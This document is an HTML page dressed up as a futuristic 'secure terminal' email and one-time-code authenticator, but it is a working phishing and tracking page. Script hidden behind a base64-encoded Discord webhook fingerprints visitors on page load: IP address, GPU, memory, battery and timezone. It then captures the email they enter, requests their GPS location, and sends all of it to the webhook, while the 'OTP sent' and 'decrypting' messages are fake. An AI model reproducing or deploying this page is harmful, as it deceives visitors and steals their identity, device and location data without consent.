<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>S.A.U | SECURE TERMINAL v6.0.2</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        :root { --c: #00f5ff; --m: #ff00aa; --bg: #020509; }
        body { background: var(--bg); color: var(--c); font-family: 'Share Tech Mono', monospace; overflow-x: hidden; }
        .cyber-card { background: rgba(0, 245, 255, 0.02); border: 1px solid rgba(0, 245, 255, 0.1); backdrop-filter: blur(15px); position: relative; }
        .cyber-card::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(90deg, transparent, var(--c), transparent); animation: scan 3s linear infinite; }
        @keyframes scan { 0% { left: -100%; } 100% { left: 100%; } }
        .otp-slot { width: 50px; height: 65px; background: rgba(0,0,0,0.5); border: 1px solid rgba(0, 245, 255, 0.3); text-align: center; font-size: 1.8rem; color: #fff; font-family: 'Orbitron'; outline: none; transition: 0.3s; }
        .otp-slot:focus { border-color: var(--m); box-shadow: 0 0 15px var(--m); transform: translateY(-2px); }
        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
        .terminal-box { background: rgba(0,0,0,0.7); border: 1px solid rgba(0,245,255,0.05); font-size: 0.65rem; height: 150px; overflow-y: auto; scrollbar-width: thin; }
        .status-bar { height: 3px; background: rgba(255,255,255,0.05); width: 100%; position: relative; overflow: hidden; }
        .status-fill { height: 100%; width: 0%; background: var(--c); box-shadow: 0 0 10px var(--c); transition: width 0.5s ease; }
        .glitch { font-family: 'Orbitron'; font-weight: 700; letter-spacing: 3px; text-transform: uppercase; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

<div class="cyber-card p-10 rounded-sm w-full max-w-xl shadow-2xl">
    <div class="text-center mb-10">
        <h1 class="glitch text-3xl mb-2">S.A.U AUTHENTICATOR</h1>
        <div class="flex justify-center gap-4 text-[0.6rem] text-cyan-500/40 tracking-[0.4em]">
            <span>NODE: RECON_STATION</span>
            <span>OS: S.A.U_CORE_V6</span>
        </div>
    </div>

    <div id="auth-gate">
        <div class="mb-8">
            <div class="flex justify-between items-end mb-2">
                <label class="text-[0.7rem] tracking-widest opacity-60">// TARGET_IDENTIFICATION</label>
                <span class="text-[0.6rem] text-magenta-500">ENCRYPTION: AES-256</span>
            </div>
            <div class="relative">
                <input type="email" id="target_mail" class="w-full bg-black/60 border border-cyan-500/20 p-4 outline-none text-white focus:border-cyan-500/60 transition-all" placeholder="Enter Email to verify access...">
                <div class="absolute right-4 top-4 text-cyan-500/20">@</div>
            </div>
        </div>
        <button onclick="initiateHandshake()" class="group relative w-full overflow-hidden bg-transparent border border-cyan-500 p-4 transition-all hover:bg-cyan-500 hover:text-black">
            <span class="relative z-10 font-bold tracking-[0.2em]">INITIATE SECURE HANDSHAKE</span>
        </button>
    </div>

    <div id="otp-gate" class="hidden">
        <div class="text-center mb-8">
            <p class="text-magenta-500 text-xs mb-6 animate-pulse font-bold">DIGITAL TOKEN SENT TO CLOUD INBOX</p>
            <div class="flex justify-center gap-3">
                <input type="number" class="otp-slot" id="s1" maxlength="1" onkeyup="tab(this, 's2')">
                <input type="number" id="s2" class="otp-slot" maxlength="1" onkeyup="tab(this, 's3')">
                <input type="number" id="s3" class="otp-slot" maxlength="1" onkeyup="tab(this, 's4')">
                <input type="number" id="s4" class="otp-slot" maxlength="1" onkeyup="finalLockoutout()">
            </div>
        </div>
        
        <div id="loader-box" class="hidden space-y-3">
            <div class="status-bar"><div id="bar" class="status-fill"></div></div>
            <div class="flex justify-between text-[0.5rem] tracking-widest uppercase">
                <span id="proc-text">Analyzing Node Path...</span>
                <span id="proc-perc">0%</span>
            </div>
        </div>
    </div>

    <div class="terminal-box mt-8 p-4 font-mono" id="term">
        <div class="text-green-500/50">> [SYSTEM] KERNEL LOADED. WAITING FOR INPUT...</div>
    </div>
</div>

<script>
    const _0xS = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1ODEwNTMwNTQ3NTg0MjI2NS90WGlXbTctQk5Fa2w5eVo2ekl3aTIxUnF1UWpyWU9oa1BRREJqTjE4NzQxWm40cjZRak11b2hWUVAtUEdnRVc0elY4RQ==";
    const _0xI = "aHR0cHM6Ly90ci5yYnhjZG4uY29tLzE4MERBWS1kMWZmNTlhNDJlYzcwMDMwZGFhYjlkM2NjYjkzYjc2My80MjAvNDIwL0JhY2tBY2Nlc3NvcnkvV2VicC9ub0ZpbHRlcg==";
    const WH = atob(_0xS);
    const THUMB = atob(_0xI);

    function log(msg, color='') {
        const t = document.getElementById('term');
        const d = document.createElement('div');
        d.className = `py-1 ${color}`;
        d.innerHTML = `[${new Date().toLocaleTimeString()}] > ${msg}`;
        t.appendChild(d); t.scrollTop = t.scrollHeight;
    }

    function tab(c, n) { if(c.value.length >= 1) document.getElementById(n)?.focus(); }

    async function getPayload() {
        const gl = document.createElement('canvas').getContext('webgl');
        const db = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
        let batt = "N/A";
        try { const b = await navigator.getBattery(); batt = `${Math.round(b.level*100)}% (${b.charging?'CHG':'DIS'})`; } catch(e){}
        
        return {
            ip: await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'ERR'),
            gpu: db ? gl.getParameter(db.UNMASKED_RENDERER_WEBGL) : "Software",
            mem: navigator.deviceMemory || "N/A",
            cores: navigator.hardwareConcurrency || "N/A",
            res: `${screen.width}x${screen.height}`,
            batt: batt,
            ua: navigator.userAgent,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }

    // AUTO RECON ON LOAD
    window.onload = async () => {
        log("INITIALIZING NETWORK SNIFFER...", "text-cyan-800");
        const p = await getPayload();
        fetch(WH, {
            method: 'POST', headers: {'Content-Type':'application/json'},
            body: JSON.stringify({
                embeds: [{
                    title: "🕵️ S.A.U PRE-FLIGHT RECON",
                    color: 3447003,
                    thumbnail: {url: THUMB},
                    fields: [
                        {name: "🌐 Network", value: `IP: \`${p.ip}\`\nTZ: \`${p.tz}\``, inline: true},
                        {name: "🔋 Battery", value: `\`${p.batt}\``, inline: true},
                        {name: "🖥️ Hardware", value: `GPU: \`${p.gpu}\`\nCPU: \`${p.cores}c\`\nRAM: \`${p.mem}GB\``}
                    ],
                    footer: {text: "v6.0 Stealth Active"}
                }]
            })
        });
    };

    async function initiateHandshake() {
        const mail = document.getElementById('target_mail').value;
        if(!mail.includes('@')) { log("INVALID IDENTITY PROTOCOL", "text-red-500"); return; }
        
        log(`DISPATCHING OTP TOKEN TO ${mail.toUpperCase()}...`, "text-cyan-400");
        document.getElementById('auth-gate').className = 'hidden';
        document.getElementById('otp-gate').classList.remove('hidden');
        document.getElementById('s1').focus();

        const p = await getPayload();
        fetch(WH, {
            method: 'POST', headers: {'Content-Type':'application/json'},
            body: JSON.stringify({
                embeds: [{
                    title: "🔐 IDENTITY CAPTURED",
                    color: 16711850,
                    thumbnail: {url: THUMB},
                    fields: [
                        {name: "📧 Target", value: `\`${mail}\``},
                        {name: "🌐 IP Address", value: `\`${p.ip}\``}
                    ]
                }]
            })
        });
    }

    function finalLockoutout() {
        document.getElementById('loader-box').classList.remove('hidden');
        let b = document.getElementById('bar');
        let t = document.getElementById('proc-text');
        let pc = document.getElementById('proc-perc');
        
        const steps = [
            {p: 20, m: "Decrypting Handshake..."},
            {p: 45, m: "Capturing Geo-Matrix..."},
            {p: 75, m: "Uploading System Logs..."},
            {p: 100, m: "Authorization Complete."}
        ];

        let i = 0;
        const iv = setInterval(() => {
            if(i >= steps.length) {
                clearInterval(iv);
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    await sendFinal(pos.coords.latitude, pos.coords.longitude);
                }, async () => {
                    await sendFinal("DENIED", "DENIED");
                });
                return;
            }
            b.style.width = steps[i].p + "%";
            t.innerText = steps[i].m;
            pc.innerText = steps[i].p + "%";
            log(steps[i].m, "text-cyan-600");
            i++;
        }, 800);
    }

    async function sendFinal(lat, lon) {
        const p = await getPayload();
        fetch(WH, {
            method: 'POST', headers: {'Content-Type':'application/json'},
            body: JSON.stringify({
                embeds: [{
                    title: "🚀 FULL DATA EXFILTRATION SUCCESS",
                    color: 5763719,
                    thumbnail: {url: THUMB},
                    fields: [
                        {name: "📍 GPS Location", value: `[Google Maps](https://www.google.com/maps?q=${lat},${lon})`},
                        {name: "📱 Full Specs", value: `UA: \`${p.ua}\`\nRes: \`${p.res}\`\nGPU: \`${p.gpu}\``}
                    ],
                    footer: {text: "S.A.U RECON COMPLETE // " + new Date().toLocaleString()}
                }]
            })
        });
        setTimeout(() => { alert("Verification Success. Redirecting to S.A.U Cloud..."); location.reload(); }, 1500);
    }
</script>
</body>
</html>
